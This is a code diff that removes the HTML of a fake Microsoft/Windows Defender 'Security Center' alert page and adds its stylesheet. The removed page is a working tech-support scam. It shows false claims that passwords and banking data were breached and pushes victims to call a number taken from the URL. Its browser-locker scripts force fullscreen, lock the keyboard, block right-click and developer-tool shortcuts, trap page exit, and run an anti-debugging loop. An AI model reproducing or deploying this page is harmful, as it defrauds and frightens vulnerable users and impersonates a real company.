@@ -1,394 +1,658 @@
-<!doctype html>
-<html lang="en">
-    <head>
-    <!-- Required meta tags -->
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="css/bootstrap.min.css" crossorigin="anonymous">
-    <script src="js/jquery.min.js"></script>
-    <link rel="stylesheet" type="text/css" href="css/main.css">
-    <title>Security Center</title>
-    <link rel="stylesheet" href="css/font-awesome.min.css">
-
-    <script>
-        function dsasfsdcscnsmndqweqwe(name)
-        {
-            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
-            var regexS = "[\\?&]"+name+"=([^&#]*)";
-            var regex = new RegExp( regexS );
-            var results = regex.exec( window.location.href );
-            if( results == null )
-                return "";
-            else
-                return results[1];
-        }
-        var phone = dsasfsdcscnsmndqweqwe('phone');
-    </script>
-
-    <script type="text/javascript">
-        window.onload = function () {
-            document.onclick = function (e) {
-                e = e || event;
-                target = e.target || e.srcElement;
-                if (target.tagName === "DIV") {
-                    toggleFullScreen();
-                    document.body.style.cursor = 'not-allowed';
-                    document.getElementById('map').innerHTML = stroka;
-                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
-                } else {
-                    toggleFullScreen();
-                    document.body.style.cursor = 'not-allowed';
-                    document.getElementById('map').innerHTML = stroka;
-                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
-                }
-            }
-        }
-    </script>
-</head>
-<body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">
-
-<div class="bg" style="cursor:none;">
-    <div class="bgimg" style="top: 0px;"><img src="images/bg2.jpg" alt width="100%"></div>
-
-</div>
-<a href="#" rel="noreferrer" id="link_black" style="cursor: none;">
-    <div class="black" style="height: 145%;cursor: none;"></div>
-</a>
-
-
-
-
-
-
-<div id="footer" style="top: 672px; position: absolute;cursor: none;">
-    <div class="row">
-
-        <div class="col-md-12">
-            <div class="right-foot" style="text-align: center;">
-                <span id="footertxt"><img src="images/microsoft.png"> Call Microsoft Security Centre: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;">(Toll-Free)<span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><script>document.write(phone)</script> </span> </span>
-            </div>
-        </div>
-        <div class="col-md-12">
-            <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 10px;">Windows Secure Services prevented an unrecognized IP Application from stating. Running this IP application might put your PC
-                    at risk. Windows Defender Scan has found potentially unwanted Threat on this device that can steal
-                    your passwords, online identity, financial information, personal Information, pictures or
-                    documents.</small></marquee>
-        </div>
-    </div>
-
-
-</div>
-
-<div id="yteuwqtudggsajdgjahs" class="lightbox">
-    <div class="ilb top">
-        <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
-            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="images/def.png" class="logo3"></span>Security Services</span>
-            <span id="txts1" class="fl title2"><a href="#"><img src="images/cross.png"></a></span>
-
-        </div>
-    </div>
-    <div id="txtintro">
-                <span class="colo-rd">App: Ads.fiancetrack(2).dll<br>
-                Threat Detected:  Trojan Spyware</span>
-    </div>
-    <img id="banner" src="images/virus-images.jpg">
-    <div id="disclaimer">
-        Access has been blocked for security reasons and for Safety.<br>
-        <span class="support">Call Windows Security Toll Free: <script>document.write(phone)</script> </span>
-    </div>
-    <div id="bottom">
-        <img id="badge" src="images/microsoft.png"><span class="title3">Microsoft</span>
-        <ul>
-            <li>
-                <a href="#">
-                    <div class="fr button2">
-                        <span id="addtochromebutton">Cancel</span>
-                    </div>
-                </a>
-            </li>
-            <li>
-                <a href="#">
-                    <div class="fr button">
-                        <span id="addtochromebutton">Scan</span>
-                    </div>
-                </a>
-            </li>
-        </ul>
-
-    </div>
-</div>
-
-<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
-    <p class="text-center" style="    font-size: 16px;
-    font-weight: normal;
-    margin: 0;
-    margin-bottom: 5px;
-    padding: 5px 10px;
-    color: #FFFFFF !important;
-    color: #414141;font-weight: bold;
-    margin-top: 8px;">MS WINDOWS DEFENDER - Warning Alert System</p>
-    <p>** ACCESS HAS BEEN BLOCKED FOR SECURITY REASONS AND FOR THE SAFETY **</p>
-    <p>Your System has alerted us that it has been infected with Spyware Issues. The following data has been
-        Breached.</p>
-    <p>&gt; Email Passwords<br>
-        &gt; Banking Passwords<br>
-        &gt; Facebook Login<br>
-        &gt; Photos &amp; Files
-
-    </p>
-    <p>Windows Security Feature has found potentially unwanted Adware on this device that can Breach your passwords, online
-        identity, financial information, files, Personal pictures or documents.</p>
-    <p>You must Call us immediately so that our System engineers can walk you through the removal process over the
-        Phone.</p>
-    <p>Contact MS Windows Toll-Free immediately to report this threat, prevent identity theft and unlock access to this
-        device.</p>
-    <p>Closing this Page will put your personal information at risk and lead to a suspension of your Windows
-        Registration Private Key.</p>
-    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Contact Microsoft (Toll-Free) Number: <strong>
-            <script>document.write(phone)</script> </strong></p>
-    <div class="action_buttons"><a class="active" id="leave_page" style="cursor: pointer; color: #FFFFFF !important;">Allow</a> <a class="active" id="leave_page" style="color: #FFFFFF !important;">Deny</a>
-    </div>
-</div>
-
-<div id="welcomeDiv" style=" display:none; background-color:rgb(40 40 40 / 62%); height: auto; width: 550px; margin-left:30%;position: absolute;z-index: 9999999999;  " class="answer_list">
-    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">You must Call us immediately so that our System engineers can walk you through the removal process over the
-        phone.<br>Your Computer is disabled. <br><br> </p>
-
-
-</div>
-
-<script src="js/modernizr.min.js" type="text/javascript"></script>
-<script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
-<script type="text/javascript" src="js/fullscreen.js"></script>
-<script type="text/javascript" src="js/before.js"></script>
-<script type="text/javascript" src="js/main.js"></script>
-<script type="text/javascript" src="js/light.js"></script>
-<script type="text/javascript">
-    $(function () {
-        var dhlaskhlncwqhhqwlelqj = 0;
-        var interval = setInterval(function () {
-            dhlaskhlncwqhhqwlelqj += 10;
-            $("#dynamic")
-                .css("width", dhlaskhlncwqhhqwlelqj + "%")
-                .attr("aria-valuenow", dhlaskhlncwqhhqwlelqj)
-                .text(dhlaskhlncwqhhqwlelqj + "% Complete");
-            if (dhlaskhlncwqhhqwlelqj >= 100)
-                clearInterval(interval);
-        }, 100);
-    });
-</script>
-<script type="text/javascript">
-    (function ($) {
-        $.fn.countTo = function (options) {
-            options = options || {};
-
-            return $(this).each(function () {
-                // set options for current element
-                var settings = $.extend({}, $.fn.countTo.defaults, {
-                    from: $(this).data('from'),
-                    to: $(this).data('to'),
-                    speed: $(this).data('speed'),
-                    refreshInterval: $(this).data('refresh-interval'),
-                    decimals: $(this).data('decimals')
-                }, options);
-
-                // how many times to update the value, and how much to increment the value on each update
-                var loops = Math.ceil(settings.speed / settings.refreshInterval),
-                    increment = (settings.to - settings.from) / loops;
-
-                // references & variables that will change with each update
-                var self = this,
-                    $self = $(this),
-                    loopCount = 0,
-                    value = settings.from,
-                    data = $self.data('countTo') || {};
-
-                $self.data('countTo', data);
-
-                // if an existing interval can be found, clear it first
-                if (data.interval) {
-                    clearInterval(data.interval);
-                }
-                data.interval = setInterval(updateTimer, settings.refreshInterval);
-
-                // initialize the element with the starting value
-                render(value);
-
-                function updateTimer() {
-                    value += increment;
-                    loopCount++;
-
-                    render(value);
-
-                    if (typeof (settings.onUpdate) == 'function') {
-                        settings.onUpdate.call(self, value);
-                    }
-
-                    if (loopCount >= loops) {
-                        // remove the interval
-                        $self.removeData('countTo');
-                        clearInterval(data.interval);
-                        value = settings.to;
-
-                        if (typeof (settings.onComplete) == 'function') {
-                            settings.onComplete.call(self, value);
-                        }
-                    }
-                }
-
-                function render(value) {
-                    var formattedValue = settings.formatter.call(self, value, settings);
-                    $self.html(formattedValue);
-                }
-            });
-        };
-
-        $.fn.countTo.defaults = {
-            from: 0,               // the number the element should start at
-            to: 0,                 // the number the element should end at
-            speed: 1,           // how long it should take to count between the target numbers
-            refreshInterval: 1,  // how often the element should be updated
-            decimals: 0,           // the number of decimal places to show
-            formatter: formatter,  // handler for formatting the value before rendering
-            onUpdate: null,        // callback method for every time the element is updated
-            onComplete: null       // callback method for when the element finishes updating
-        };
-
-        function formatter(value, settings) {
-            return value.toFixed(settings.decimals);
-        }
-    }(jQuery));
-
-    jQuery(function ($) {
-        // custom formatting example
-        $('.count-number').data('countToOptions', {
-            formatter: function (value, options) {
-                return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ',');
-            }
-        });
-
-        // start all the timers
-        $('.timer').each(count);
-
-        function count(options) {
-            var $this = $(this);
-            options = $.extend({}, options || {}, $this.data('countToOptions') || {});
-            $this.countTo(options);
-        }
-    });
-</script>
-<script type="text/javascript">
-    $(document).ready(function () {
-        $(".pro_box2").delay(1).fadeIn(800);
-        $(".pro_box3").delay(1).fadeIn(800);
-        $(".pro_box3").delay(1).fadeIn(800);
-        $("#pop_up_new").delay(1).fadeIn(800);
-        $("#yteuwqtudggsajdgjahs").delay(1).fadeIn(800);
-    });
-</script>
-<script type="text/javascript">
-    document.addEventListener('keyup', function (es) {
-        if (es.keyCode === 27) {
-            toggleFullScreen();
-        }
-    }, false);
-</script>
-<script type="text/javascript">
-    document.addEventListener('keyup', function (e) {
-        if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
-            document.getElementById('map').innerHTML = stroka;
-            toggleFullScreen();
-        }
-    }, false);
-</script>
-<script>
-    var modal = document.getElementById('myModal');
-    var btn = document.getElementById("myBtn");
-    var span = document.getElementsByClassName("close")[0];
-
-   
-    span.onclick = function () {
-        modal.style.display = "none";
-    }
-
-    window.onclick = function (event) {
-        if (event.target == modal) {
-            modal.style.display = "none";
-        }
-    }
-    $(document).ready(function () {
-        $("#mycanvas").click(function () { $("#welcomeDiv").show();});
-        
-        $("body").mouseover(function () {$("#yteuwqtudggsajdgjahs").show();
-        });
-        
-    });
-</script>
-</body>
-
-<script>
-      function play() {
-        var audio = document.getElementById("audio");
-        audio.play();
-      }
- </script>
-<script>
-navigator.keyboard.lock();
-document.onkeydown = function (e) {
-return false;
+body{
+   overflow-y: hidden; 
 }
-</script>
-    <script>
+#pop_up_new{
+    position: absolute;
+    top: 6%;
+    z-index: 999999;
+    left: 36%;
+    background: #1a73e8;
+    width: 440px;
+    text-align: left;
+    padding-top: 4px;
+    display: none;
+    color: #FFFFFF;
+    padding-left: 20px;
+    padding-right: 20px;
+}
 
-    document.onkeydown = function (e) {
-        if (event.keyCode == 123) {
-            return false;
-        }
-        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'i'.charCodeAt(0))) {
-            return false;
-        }
-        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'l'.charCodeAt(0) || e.keyCode == 'l'.charCodeAt(0))) {
-            return false;
-        }
-        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'c'.charCodeAt(0))) {
-            return false;
-        }
-        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'j'.charCodeAt(0))) {
-            return false;
-        }
-        if (e.ctrlKey && (e.keyCode == 'U'.charCodeAt(0) || e.keyCode == 'u'.charCodeAt(0))) {
-            return false;
-        }
-        if (e.ctrlKey && (e.keyCode == 'S'.charCodeAt(0) || e.keyCode == 's'.charCodeAt(0))) {
-            return false;
-        }
-    }
-</script>
-<script>
-document.addEventListener('contextmenu', event => event.preventDefault());
-(function () {
-        (function a() {
-            try {
-                (function b(i) {
-                    if (('' + (i / i)).length !== 1 || i % 20 === 0) {
-                        (function () { }).constructor('debugger')()
-                    } else {
-                        debugger
-                    }
-                    b(++i)
-                }
-                )(0)
-            } catch (e) {
-                setTimeout(a, 5)
-            }
-        }
-        )()
-    }
-    )();
-    delete window.console
-console.log('test');
-</script>
+#pop_up_new p{
+    font-weight: 500;
+    font-size: 12px;
+        line-height: 21px;
+}
+#pop_up_new .action_buttons a.active {
+    border: 1px solid #fff;
+    font-weight: bold;
+}
+#pop_up_new .action_buttons a {
+    float: right;
+    font-size: 12px;
+    margin-right: 15px;
+    padding: 6px 25px;
+    text-decoration: none;
+    color: #000 !important;
+    border: 1px solid #DDD;
+    margin-top: 20px;
+    border-radius: 2px;
+    margin-bottom: 20px;
+}
 
-</html>
+@keyframes zoominoutsinglefeatured {
+    0% {
+        transform: scale(1,1);
+    }
+    50% {
+        transform: scale(1.1,1.1);
+    }
+    100% {
+        transform: scale(1,1);
+    }
+}
+
+@keyframes zoomininsinglefeatured {
+    0% {
+        transform: scale(1,1);
+    }
+    50% {
+        transform: scale(1.1,1.1);
+    }
+    100% {
+        transform: scale(1,1);
+    }
+}
+.black {
+    width: 100%;
+    height: 100%;
+    background-color: #000;
+    opacity: 0.7;
+    transition: 1s;
+    position: absolute;
+    top: -190px;
+}
+.bg .bgimg {
+    position: absolute;
+    top: 60px;
+    left: 0px;
+    width: 100%;
+}
+.pro_box_header{
+    box-shadow: 0 2px 5px 1px rgb(64 60 67 / 16%);
+}
+.pro_box{
+        width: 750px;
+    height: 536px;
+    position: absolute;
+    z-index: 99;
+    background-color: #fff;
+        left: 26%;
+    top: 15%;
+   
+}
+
+.pro_box2{
+     width: 850px;
+    height: 600px;
+    position: absolute;
+    z-index: 9999;
+    background-color: #fff;
+        left: 23%;
+    top: 7%;
+    display: none;
+}
+.pro_box3{
+     width: 850px;
+    height: 600px;
+    position: absolute;
+    z-index: 999999;
+    background-color: #fff;
+    left: 23%;
+    top: 7%;
+     display: none;
+}
+
+.minimize ul{
+    list-style-type: none;
+    float: right;
+}
+.minimize ul li{
+    float: left;
+    display: inline-block;
+
+}
+.minimize ul li a img{
+width: 140px;
+height: auto;
+}
+.logo{
+        margin-left: 20px;
+}
+.logo img{
+    width: 30px;
+}
+.logo span{
+        font-weight: bold;
+    margin-left: 6px;
+    font-size: 18px;
+}
+.activate_lic ul{
+    list-style-type: none;
+    float: right;
+}
+.activate_lic ul li{
+    float: left;
+    display: inline-block;
+
+}
+.activate_lic ul li a{
+    padding: 10px;
+}
+.activate_lic ul li a button{
+       background-color: transparent;
+    border: 2px solid #a5add1;
+    color: #3947b0;
+    padding: 5px;
+    border-radius: 6px;
+    text-align: center;
+        position: relative;
+    top: -3px;
+}
+
+.scan_box{
+   width: 700px;
+   height: 393px;
+    background-color: #fff;
+    box-shadow: 0 2px 5px 1px rgb(64 60 67 / 16%);
+    margin: 0px auto;
+    margin-top: 20px;
+    display: block;
+}
+.scan_box_header{
+    border-bottom:1px solid #c1c1c1;
+        height: 50px;
+}
+.quick_scan{
+        margin: 10px 0 0 16px;
+}
+.quick_scan p{
+    font-size: 18px;
+    font-weight: bold;
+}
+.quick_scan img{
+    width: 25px;
+        margin-right: 6px;
+    
+}
+.minimize1 ul{
+      list-style-type: none;
+    float: right;
+    margin-top: 10px;
+}
+.minimize1 ul li{
+    float: left;
+    display: inline-block;
+
+}
+.minimize1 ul li a img{
+    width: 140px;
+    height: auto;
+}
+.progress {
+      margin-top: 15px;
+    width:665px;
+    margin-left: 19px;
+        height: 25px;
+}
+.progress-bar{
+        height: 25px;
+}
+#dynamic{
+    color: #fff;
+    font-size: 15px;
+    font-weight: 700;
+}
+.table_quick .table{
+    width: 665px;
+    margin-left: 20px;
+    border-radius: .25rem;
+    margin-top: 20px;
+}
+.table_quick .table td, .table th{
+        padding: .25rem;
+}
+.table-bordered td, .table-bordered th{
+    border-bottom: 1px solid #dee2e6;
+    border-bottom-width: 1px;
+}
+.bt_can{
+        margin-top: 103px;
+    margin-left: 28px;
+}
+.bt_can .btn{
+        background: transparent;
+    color: #000;
+    margin-right: 15px;
+    height: 30px;
+    padding: 12px;
+    width: 80px;
+    text-align: center;
+    line-height: 0px;
+}
+.bt_can .btn:focus{
+box-shadow: none;
+}
+.bt_can .btn:hover{
+background-color: #007BFF;
+    border-color: #007BFF;
+    color: #fff;
+}
+.bt_can2 .btn:hover{
+background-color: #007BFF;
+    border-color: #007BFF;
+    color: #fff;
+}
+.btn-secondary:not(:disabled):not(.disabled).active, .btn-secondary:not(:disabled):not(.disabled):active, .show>.btn-secondary.dropdown-toggle{
+    background-color: #007BFF;
+    border-color: #007BFF;
+    color: #fff;
+}
+
+.bt_can2{
+           margin-top: 103px;
+    float: right;
+}
+.bt_can2 .btn{
+         background: transparent;
+    color: #000;
+    margin-right: 15px;
+    height: 30px;
+    padding: 12px;
+    width: 160px;
+    text-align: center;
+    line-height: 0px;
+}
+.bt_can2 .btn:focus{
+box-shadow: none;
+}
+
+
+.counter { 
+    background-color: #ffffff;
+    padding: 0;
+    border-radius: 5px;
+}
+.count-title {
+
+        font-size: 1rem;
+    font-weight: bold;
+    margin-bottom: 0;
+    text-align: left;
+
+ }
+.count-text { font-size: 13px; font-weight: normal;  margin-top: 10px; margin-bottom: 0; text-align: center; }
+.fa-2x { margin: 0 auto; float: none; display: table; color: #4ad1e5; }
+.total_detail ul{
+    list-style-type: none;
+    float: right;
+        margin-top: 8px;
+}
+.total_detail ul li{
+       float: left;
+    display: inline-block;
+    font-size: 11px;
+    padding-left: 10px;
+    padding-right: 15px;
+    text-align: center;
+}
+.total_detail ul li a{
+    text-decoration: none;
+}
+.total_detail ul li a p{
+    line-height: 12px;
+    margin-bottom: 3px;
+    color: #000;
+    font-weight: 700;
+}
+.new_heading{
+     margin-top: 8px;
+         margin-left: 20px;
+}
+.scan_box2 {
+    width: 800px;
+    height: 460px;
+    box-shadow: 0 2px 5px 1px rgb(64 60 67 / 16%);
+    margin: 0px auto;
+    margin-top: 20px;
+    display: block;
+}
+
+.table_quick2 .table {
+    width: 767px;
+    margin-left: 20px;
+    border-radius: .25rem;
+    margin-top: 0px;
+}
+.table_quick2 .table td, .table_quick2 .table th {
+    padding: .12rem;
+        font-size: 12px;
+}
+.mar_lef{
+    margin-left: 10px;
+}
+#table_scroll{
+     height:60px;
+    overflow-y:auto;
+    width: 100%;
+}
+.scan_footer2{
+       margin-top: -80px;
+}
+.table_quick2{
+    margin-top: -22px;
+}
+.bg_blue{
+    background-color: #007BFF;
+    border-color: #007BFF;
+    color: #fff;
+}
+.total_detail_scan ul{list-style-type: none;}
+.total_detail_scan ul li{
+float: left;
+    display: inline-block;
+    width: 140px;
+    font-size: 17px;
+    font-weight: 600;
+}
+.total_detail_scan{
+padding: 17px 0;
+    margin-left: -18px;}
+
+.total_detail_scan ul li:first-child:before{
+    border-bottom: 2px solid #204289;
+    position: absolute;
+    content: '';
+    display: block;
+    background-color: #204289;
+    width: 70px;
+    height: 2px;
+    top: 42px;
+}
+.total_detail_scan ul li:first-child{
+        width: 90px;
+}
+.total_detail_scan ul li a{
+    text-decoration: none;
+}
+.pc_desk {
+    padding: 63px 2px 0px 46px;
+}
+.mar_top{
+    position: relative;
+    top: 16px;
+}
+.mar_top ul{
+list-style-type: none;
+padding-inline-start: 0px;
+}
+.mar_top ul li{
+    line-height: 30px;
+}
+.pause_can{
+    margin-top: -66px;
+}
+.mar_top:before{
+         width: 1px;
+    height: 200px;
+    content: '';
+    background-color: #eee;
+    position: absolute;
+    display: block;
+    right: 2px;
+
+}
+.scan_dur{}
+.scan_dur p{margin-bottom: 0px;}
+.scan_footer3 {
+       margin-top: 39px;
+    margin-left: 0px;
+    background: #eee;
+    padding: 10px;
+}
+.viruses img{
+    width: 68px;
+    padding-top: 5px;
+    padding-bottom: 10px;
+}
+.make_this{
+    margin-top: 8px;
+    
+}
+.viruses{
+        margin-left: 45px;
+}
+.make_this p{
+    margin-bottom: 0px;
+    font-size: 14px;
+    font-weight: 600;
+}
+
+
+.circular-spinner {
+ margin-top: 30px;
+    width: 20px;
+    height: 20px;
+    border: 2px solid white;
+    border-top: 2px solid #454d7c;
+    border-radius: 100%;
+    animation: rotate 1.5s linear infinite;
+    float: left;
+    position: relative;
+    top: -25px;
+    left: -4px;
+}
+
+@keyframes rotate {
+  from {transform: rotate(0);}
+  to {transform: rotate(360deg);}
+}
+
+#footer {
+    width: 100%;
+    position: fixed;
+    bottom: 0;
+    background-color: #1a73e8;
+    z-index: 999;
+    
+    padding: 10px 34px;
+    color: #fff;
+    font-size: 18px;
+    height: 81px;
+    cursor: pointer;
+}
+#footer .right-foot{
+
+}
+#footertxt,
+#footertxt2 {
+    font-size: 20px;
+}
+#footertxt img{
+    width: 20px;
+}
+#footertxt2 {
+    display: none;
+}
+#yteuwqtudggsajdgjahs {
+    font-weight: 700;
+    padding: 15px 30px;
+    min-height: 300px;
+    border-radius: 10px;
+    border: 1px solid #fff;
+    width: 620px;
+    display: block;
+    margin: 0 auto;
+    background-color: #fff;
+    z-index: 9999999;
+    box-shadow: 5px 5px 15px 5px rgba(0, 0, 0, 0.4);
+    position: absolute;
+    top: 27%;
+        left: 30%;
+        cursor: pointer;
+        display: none;
+}
+.ilb {
+    display: inline-block;
+}
+#disclaimer {
+    margin: 5px;
+    font-size: 17px;
+    font-weight: bold;
+    text-align: center;
+}
+.logo3 {
+    margin: 0 7px 0 0;
+    width: 30px;
+    height: 30px;
+}
+.title2 img {
+    position: absolute;
+    width: 3%;
+    top: 27px;
+    right: 17px;
+}
+#txtintro{
+    clear: both;
+    padding-top: 0px;
+        font-size: 14px;
+    font-weight: 600;
+    text-align: center;
+}
+.colo-rd{
+    color: #ff0000;
+}
+.logo_head{
+    font-size: 14px;
+    font-weight: 600;
+    color: #000;
+}
+#badge {
+    margin-top: 22px;
+    height: 27px;
+}
+.title3 {
+    font-size: 18px;
+    font-weight: 700;
+    text-transform: capitalize;
+    position: relative;
+    width: 3%;
+    top: 21px;
+    left: 8px;
+}
+#bottom ul {
+    list-style-type: none;
+    margin-left: 190px;
+}
+#bottom ul li {
+    display: inline-block;
+    float: left;
+    padding-left: 20px;
+    margin-top: 13px;
+}
+.button {
+    border-radius: 4px;
+    padding: 10px 30px 10px 30px;
+    color: #fff;
+    background-color: #1a73e8;
+    font-size: 18px;
+    font-weight: 700;
+    text-align: center;
+    cursor: pointer;
+}
+.button2 {
+    border-radius: 4px;
+    padding: 10px 30px 10px 30px;
+    color: #000;
+    border: 1px solid #000;
+    background-color: transparent;
+    font-size: 18px;
+    font-weight: 700;
+    text-align: center;
+    cursor: pointer;
+}
+.button2:hover{
+color: #fff;
+    background-color: #1a73e8;
+    border-color: #1a73e8;
+
+}
+.cardcontainer {
+  animation: zoominoutsinglefeatured 4s infinite ;
+}
+@keyframes zoominoutsinglefeatured {
+    0% {
+        transform: scale(1,1);
+    }
+    50% {
+        transform: scale(1.1,1.1);
+    }
+    100% {
+        transform: scale(1,1);
+    }
+}
+
+@keyframes zoomininsinglefeatured {
+    0% {
+        transform: scale(1,1);
+    }
+    50% {
+        transform: scale(1.1,1.1);
+    }
+    100% {
+        transform: scale(1,1);
+    }
+}
+.support{
+        font-weight: bold;
+    font-size: 17px;
+    color: #1a73e8;
+}
+#bottom {
+    margin: 12px 0;
+    height: 50px;
+    display: flex;
+        border-top: 1px solid #d6d5d5;
+
+}
+#bottom ul{list-style-type: none;    margin-left: 190px;}
+#bottom ul li{
+display: inline-block;
+    float: left;
+    padding-left: 20px;
+    margin-top: 13px;
+}
+#txtclickon1,
+#txtclickon2 {
+    margin-left: 5px;
+}
+#txtaex,
+#txtatc {
+    font-weight: 700;
+    text-decoration: underline;
+}
+#txts3 {
+    margin-left: 30px;
+}
+#instructions {
+    display: none;
+    margin: 5px 0 -8px;
+}
+#banner {
+    margin: 5px auto;
+    display: block;
+}
+
+.headers {
+    width: 535px;
+    margin-top: 7px;
+    padding-bottom: 10px;
+}
